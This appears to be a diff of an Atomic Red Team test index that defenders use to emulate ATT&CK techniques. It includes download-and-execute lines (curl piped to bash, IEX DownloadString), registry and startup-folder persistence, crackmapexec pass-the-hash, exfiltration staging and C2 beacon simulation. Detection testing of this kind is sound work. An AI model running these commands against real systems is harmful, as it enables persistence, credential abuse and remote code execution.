+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -22981,11 +23679,12 @@ execution:
       executor:
         name: command_prompt
         elevation_required: false
-        prereq_command: ''
         command: |
           set comspec=#{command_to_execute}
           cscript manage-bde.wsf
-        cleanup_command: set comspec=C:\Windows\System32\cmd.exe
+        cleanup_command: 'set comspec=C:\Windows\System32\cmd.exe
+
+'
   T1153:
     technique:
       x_mitre_data_sources:
@@ -23182,15 +23881,13 @@ execution:
         After sending a keyboard interrupt (CTRL+C) the script will download and execute.
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
         command: |
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" EXIT
           exit
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" SIGINt
   T1127:
     technique:
       x_mitre_data_sources:
@@ -23330,7 +24027,7 @@ execution:
         filename:
           description: Location of the project file
           type: Path
-          default: T1127.csproj
+          default: PathToAtomicsFolder\T1127\src\T1127.csproj
       executor:
         name: command_prompt
         elevation_required: false
@@ -24017,44 +24714,61 @@ lateral-movement:
       identifier: T1037
     atomic_tests:
     - name: Logon Scripts
-      description: 'Added Via Reg.exe
+      description: 'Adds a registry value to run batch script created in the C:\Windows\Temp
+        directory.
 
 '
       supported_platforms:
       - windows
       input_arguments:
+        script_path:
+          description: Path to .bat file
+          type: String
+          default: "$env:SystemRoot\\Temp\\art.bat"
         script_command:
           description: Command To Execute
           type: String
-          default: cmd.exe /c calc.exe
+          default: echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037-log.txt
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ
-          /d "#{script_command}"
-
-'
-        cleanup_command: 'REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript
-          /f
-
-'
-    - name: Starup Folder Script
-      description: 'A batch file on startup when placed in the start menu folder
+        command: |
+          echo cmd /c "#{script_command}" > #{script_path}
+          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}"
+        cleanup_command: |
+          REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
+          del #{script_path} >nul 2>nul
+          del "%USERPROFILE%\desktop\T1037-log.txt" >nul 2>nul
+    - name: Startup Folder Script
+      description: 'A batch file created to run on startup when placed in the start
+        menu folder
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        user_command:
+          description: Path to .bat file
+          type: String
+          default: echo Art `"Startup Folder Script`" atomic test for $env:USERNAME
+            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
+        system_command:
+          description: Command To Execute
+          type: String
+          default: echo Art `"Startup Folder Script`" atomic test for $env:COMPUTERNAME
+            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
       executor:
         name: powershell
-        elevation_required: false
+        elevation_required: true
         command: |
-          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
-          Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "echo T1037"
-          New-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
-          Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "echo T1037"
+          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
+          Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{user_command}"
+          New-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
+          Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{system_command}"
         cleanup_command: |
-          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
-          Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
+          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -ErrorAction Ignore
+          Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -ErrorAction Ignore
+          Remove-Item "$env:USERPROFILE\desktop\T1037-log.txt" -ErrorAction Ignore
     - name: Scheduled Task Startup Script
       description: 'Run an exe on user logon or system startup
 
@@ -24182,13 +24896,20 @@ lateral-movement:
           description: command to execute
           type: string
           default: whoami
+        crackmapexec_exe:
+          description: crackmapexec windows executable
+          type: Path
+          default: C:\CrackMapExecWin\crackmapexec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: CrackMapExec executor must exist on disk at specified location
+          (#{crackmapexec_exe})
+        prereq_command: 'if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }'
+        get_prereq_command: 'Write-Host Automated installer not implemented yet, please
+          install crackmapexec manually at this location: #{crackmapexec_exe}'
       executor:
         name: command_prompt
         elevation_required: false
-        prereq_command: 'powershell -c if(Test-Path C:\CrackMapExecWin\crackmapexec.exe)
-          { 0 } else { -1 }
-
-'
         command: "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command}
           \n"
   T1097:
@@ -24373,13 +25094,15 @@ lateral-movement:
           description: Username argument default %USERDOMAIN%\%username%
           type: String
           default: "$Env:USERDOMAIN\\$ENV:USERNAME"
+      dependencies:
+      - description: Computer must be domain joined
+        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {0} else {1}
+        get_prereq_command: Write-Host Joining this computer to a domain must be done
+          manually
       executor:
         name: powershell
         elevation_required: false
-        prereq_command: 'if((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain)
-          {0} else {1}
-
-'
         command: 'Connect-RDP -ComputerName #{logonserver} -User #{username}
 
 '
@@ -25096,33 +25819,12 @@ collection:
       modified: '2019-06-18T13:16:53.385Z'
       identifier: T1123
     atomic_tests:
-    - name: SourceRecorder via Windows command prompt
-      description: 'Create a file called test.wma, with the duration of 30 seconds
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        output_file:
-          description: Path to the recording file being captured
-          type: Path
-          default: test.wma
-        duration_hms:
-          description: Duration of audio to be recorded (in h:m:s format)
-          type: Path
-          default: 30
-      executor:
-        name: command_prompt
-        elevation_required: false
-        command: 'SoundRecorder /FILE #{output_file} /DURATION #{duration_hms}
-
-'
-    - name: PowerShell Cmdlet via Windows command prompt
+    - name: using device audio capture commandlet
       description: "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n"
       supported_platforms:
       - windows
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
         command: 'powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet
 
@@ -25296,7 +25998,11 @@ collection:
         elevation_required: false
         command: |
           dir | clip
-          clip < readme.txt
+          echo "T1115" > %temp%\T1115.txt
+          clip < %temp%\T1115.txt
+        cleanup_command: 'del %temp%\T1115.txt
+
+'
     - name: PowerShell
       description: 'Utilize PowerShell to echo a command to clipboard and execute
         it
@@ -25309,7 +26015,7 @@ collection:
         elevation_required: false
         command: |
           echo Get-Process | clip
-          Get-Clipboard | iex
+          iex Get-Clipboard
   T1074:
     technique:
       x_mitre_data_sources:
@@ -25362,7 +26068,7 @@ collection:
       executor:
         name: powershell
         elevation_required: false
-        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')
+        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat'')
           > pi.log
 
 '
@@ -25376,12 +26082,13 @@ collection:
       - macos
       executor:
         name: bash
-        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
+        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh
           | bash -s > /tmp/discovery.log
 
 '
-    - name: Zip a Folder with PowerShell
-      description: 'use living off the land tools to encrypt and zip a file for exfiltration
+    - name: Zip a Folder with PowerShell for Staging in Temp
+      description: 'Use living off the land tools to zip a file and stage it in the
+        Windows temporary folder for later exfiltration.
 
 '
       supported_platforms:
@@ -25389,11 +26096,11 @@ collection:
       executor:
         name: powershell
         elevation_required: false
-        command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_encrypt
-          -DestinationPath $env:TEMP\Folder_to_encrypt.zip
+        command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_zip
+          -DestinationPath $env:TEMP\Folder_to_zip.zip
 
 '
-        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_encrypt.zip
+        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_zip.zip
 
 '
   '':
@@ -25595,18 +26302,21 @@ collection:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        output_file:
+          description: Output file path
+          type: String
+          default: "$home\\desktop\\mail.csv"
       executor:
         name: command_prompt
         elevation_required: false
-        command: |
-          Display email contents in the terminal
-            PS C:\> .\Get-Inbox.ps1
+        command: 'powershell -executionpolicy bypass -command $PathToAtomicsFolder\T1114\Get-Inbox.ps1
+          -file #{output_file}
 
-          Write emails out to a CSV
-            PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
+'
+        cleanup_command: 'del #{output_file}
 
-          Download and Execute
-            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114/Get-Inbox.ps1')"
+'
   T1056:
     technique:
       x_mitre_data_sources:
@@ -25942,16 +26652,31 @@ exfiltration:
           description: Path where resulting compressed data should be placed
           type: Path
           default: "%USERPROFILE%\\data.rar"
+        rar_installer:
+          description: Winrar installer
+          type: Path
+          default: "%TEMP%\\winrar.exe"
+        rar_exe:
+          description: The RAR executable from Winrar
+          type: Path
+          default: "%programfiles%/WinRAR/Rar.exe"
+      dependencies:
+      - description: Rar tool must be installed at specified location (#{rar_exe})
+        prereq_command: if not exist "#{rar_exe}" (exit /b 1)
+        get_prereq_command: |-
+          echo Downloading Winrar installer
+          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
+          echo Follow the installer prompts to install Winrar
+          #{rar_installer}
       executor:
         name: command_prompt
         elevation_required: false
-        prereq_command: 'rar /?
+        command: '"#{rar_exe}" a -r #{output_file} #{input_path} *#{file_extension}
 
 '
-        command: 'rar a -r #{output_file} #{input_path}*{file_extension}
+        cleanup_command: 'del #{output_file}
 
 '
-        cleanup_command: del -f
     - name: Data Compressed - nix - zip
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard zip compression.
@@ -25970,16 +26695,23 @@ exfiltration:
           description: Path that should be output as a zip archive
           type: Path
           default: "$HOME/data.zip"
+      dependencies:
+      - description: Files to zip must exist (#{input_files})
+        prereq_command: 'ls #{input_files}'
+        get_prereq_command: echo Please set input_files argument to include files
+          that exist
       executor:
         name: sh
         elevation_required: false
-        prereq_command: 'ls #{input_file}
+        prereq_command: 'ls #{input_files} > /dev/null
 
 '
         command: 'zip #{output_file} #{input_files}
 
 '
-        cleanup_command: rm -f
+        cleanup_command: 'rm -f #{output_file}
+
+'
     - name: Data Compressed - nix - gzip Single File
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard gzip compression.
@@ -26025,16 +26757,20 @@ exfiltration:
           description: File that should be output
           type: Path
           default: "$HOME/data.tar.gz"
+      dependencies:
+      - description: Folder to zip must exist (#{input_file_folder})
+        prereq_command: 'test -e #{input_file_folder}'
+        get_prereq_command: echo Please set input_file_folder argument to a folder
+          that exists
       executor:
         name: sh
         elevation_required: false
-        prereq_command: 'test -e #{input_file_folder}
-
-'
         command: 'tar -cvzf #{output_file} #{input_file_folder}
 
 '
-        cleanup_command: 'rm -f #{output_file}'
+        cleanup_command: 'rm -f #{output_file}
+
+'
   T1022:
     technique:
       x_mitre_data_sources:
@@ -26090,27 +26826,30 @@ exfiltration:
       modified: '2018-10-17T00:14:20.652Z'
       identifier: T1022
     atomic_tests:
-    - name: Data Encrypted with zip and gpg
+    - name: Data Encrypted with zip and gpg symmetric
       description: 'Encrypt data for exiltration
 
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
         elevation_required: false
+        prereq_command: which gpg
         command: |
-          echo "This file will be encrypted" > /tmp/victim-gpg.txt
-          mkdir PathToAtomicsFolder/T1022/victim-files
+          mkdir /tmp/victim-files
           cd /tmp/victim-files
           touch a b c d e f g
-          zip --password "insert password here" $PathToAtomicsFolder/victim-files.zip /tmp/victim-files/*
-          gpg -c $PathToAtomicsFolder/T1022/victim-gpg.txt
-          <enter passphrase and confirm>
+          echo "creating zip with password 'insert password here'"
+          zip --password "insert password here" ./victim-files.zip ./*
+          echo "encrypting file with gpg, you will need to provide a password"
+          gpg -c /tmp/victim-files/victim-filex.zip
+          #<enter passphrase and confirm>
           ls -l
+        cleanup_command: 'rm -Rf /tmp/victim-files
+
+'
     - name: Compress Data and lock with password for Exfiltration with winrar
       description: |
         Note: Requires winrar installation
@@ -26132,6 +26871,28 @@ exfiltration:
         wzzip sample.zip -s"blueblue" *.txt (VARIANT)
       supported_platforms:
       - windows
+      input_arguments:
+        winzip_exe:
+          description: Path to installed Winzip executable
+          type: Path
+          default: "%ProgramFiles%\\WinZip\\winzip64.exe"
+        winzip_url:
+          description: Path to download Windows Credential Editor zip file
+          type: url
+          default: https://download.winzip.com/gl/nkln/winzip24-home.exe
+        winzip_hash:
+          description: File hash of the Windows Credential Editor zip file
+          type: String
+          default: B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Winzip must be installed
+        prereq_command: cmd /c 'if not exist "#{winzip_exe}" (echo 1) else (echo 0)'
+        get_prereq_command: |-
+          if(Invoke-WebRequestVerifyHash "#{winzip_url}" "$env:Temp\winzip.exe" #{winzip_hash}){
+            Write-Host Follow the installation prompts to continue
+            cmd /c "$env:Temp\winzip.exe"
+          }
       executor:
         name: command_prompt
         elevation_required: false
@@ -26140,7 +26901,7 @@ exfiltration:
           mkdir .\tmp\victim-files
           cd .\tmp\victim-files
           echo "This file will be encrypted" > .\encrypted_file.txt
-          winzip32 -min -a -s"hello" archive.zip *
+          "#{winzip_exe}" -min -a -s"hello" archive.zip *
           dir
     - name: Compress Data and lock with password for Exfiltration with 7zip
       description: 'Note: Requires 7zip installation
@@ -26209,8 +26970,6 @@ exfiltration:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
@@ -26286,8 +27045,6 @@ exfiltration:
         Remote to Local
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         domain:
@@ -26315,8 +27072,6 @@ exfiltration:
         Local to Remote
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         domain:
@@ -26345,8 +27100,6 @@ exfiltration:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: manual
@@ -26378,7 +27131,7 @@ exfiltration:
         ip_address:
           description: Destination IP address where the data should be sent.
           type: String
-          default: 1.1.1.1
+          default: 127.0.0.1
       executor:
         name: powershell
         elevation_required: false
@@ -26991,7 +27744,7 @@ command-and-control:
       modified: '2019-06-21T15:16:29.198Z'
       identifier: T1071
     atomic_tests:
-    - name: Malicious User Agents
+    - name: Malicious User Agents - Powershell
       description: |
         This test simulates an infected host beaconing to command and control.
         Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
@@ -27010,6 +27763,24 @@ command-and-control:
           Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
           Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
           Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
+    - name: Malicious User Agents - CMD
+      description: |
+        This test simulates an infected host beaconing to command and control.
+        Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: www.google.com
+      executor:
+        name: command_prompt
+        command: |
+          curl -s -A "HttpBrowser/1.0" -m3 #{domain}
+          curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
+          curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
+          curl -s -A "*<|>*" -m3 #{domain}
     - name: Malicious User Agents - Nix
       description: |
         This test simulates an infected host beaconing to command and control.
